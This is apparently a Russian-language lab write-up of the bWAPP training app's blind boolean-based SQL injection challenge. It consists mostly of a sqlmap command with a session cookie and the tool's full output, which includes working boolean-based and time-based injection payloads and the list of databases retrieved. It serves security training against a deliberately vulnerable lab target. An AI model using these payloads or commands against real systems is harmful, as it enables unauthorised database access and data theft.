---
title: SQL_Injection_-_Blind_-_Boolean-Based
sidebar_position: 1
---

# SQL Injection - Blind - Boolean-Based

**(low)**


В прошлый раз у меня была ошибка, поэтому исправляемся и переписываем запрос для sqlmap

┌──(kali㉿kali)-[~]

└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli\_4.php --cookie="PHPSESSID=68d0c36b54a0976f21daa4c57c4e57e2; security\_level=0" --data="title=Iron+Man&action=search" -p title --dbs

\_\_\_

\_\_H\_\_

\_\_\_ \_\_\_["]\_\_\_\_\_ \_\_\_ \_\_\_ \{1.9.10#stable\}

|\_ -| . ['] | .'| . |

|\_\_\_|\_ [.]\_|\_|\_|\_\_,| \_|

|\_|V... |\_| https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[\*] starting @ 07:07:04 /2025-11-12/

[07:07:04] [INFO] testing connection to the target URL

[07:07:04] [WARNING] potential CAPTCHA protection mechanism detected

[07:07:04] [INFO] checking if the target is protected by some kind of WAF/IPS

[07:07:04] [INFO] testing if the target URL content is stable

[07:07:05] [INFO] target URL content is stable

[07:07:05] [WARNING] heuristic (basic) test shows that POST parameter 'title' might not be injectable

[07:07:05] [INFO] testing for SQL injection on POST parameter 'title'

[07:07:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[07:07:05] [INFO] POST parameter 'title' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=" **The** movie exists in our database!")

[07:07:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'

[07:07:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'

[07:07:05] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'

[07:07:05] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'

[07:07:05] [INFO] testing 'Generic inline queries'

[07:07:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'

[07:07:05] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'

[07:07:05] [INFO] testing 'Oracle stacked queries (DBMS\_PIPE.RECEIVE\_MESSAGE - comment)'

[07:07:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[07:07:15] [INFO] POST parameter 'title' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable

it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y

[07:07:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'

[07:07:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found

[07:07:23] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test

[07:07:23] [INFO] target URL appears to have 7 columns in query

do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y

[07:08:18] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')

[07:08:18] [INFO] target URL appears to be UNION injectable with 7 columns

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y

[07:08:27] [INFO] checking if the injection point on POST parameter 'title' is a false positive

POST parameter 'title' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

sqlmap identified the following injection point(s) with a total of 2252 HTTP(s) requests:

---

Parameter: title (POST)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: title=Iron Man' AND 9841=9841 AND 'ZHzy'='ZHzy&action=search

Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

Payload: title=Iron Man' AND (SELECT 2849 FROM (SELECT(SLEEP(5)))VlHP) AND 'kfFV'='kfFV&action=search

---

[07:08:44] [INFO] the back-end DBMS is MySQL

web server operating system: Linux Ubuntu 8.04 (Hardy Heron)

web application technology: Apache 2.2.8, PHP 5.2.4

back-end DBMS: MySQL >= 5.0.12

[07:08:44] [INFO] fetching database names

[07:08:44] [INFO] fetching number of databases

[07:08:44] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

[07:08:44] [INFO] retrieved: 4

[07:08:44] [INFO] retrieved: information\_schema

[07:08:45] [INFO] retrieved: bWAPP

[07:08:46] [INFO] retrieved: drupageddon

[07:08:46] [INFO] retrieved: mysql

available databases [4]:

[\*] bWAPP

[\*] drupageddon

[\*] information\_schema

[\*] mysql

[07:08:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.42.132'

[\*] ending @ 07:08:47 /2025-11-12/

┌──(kali㉿kali)-[~]

└─$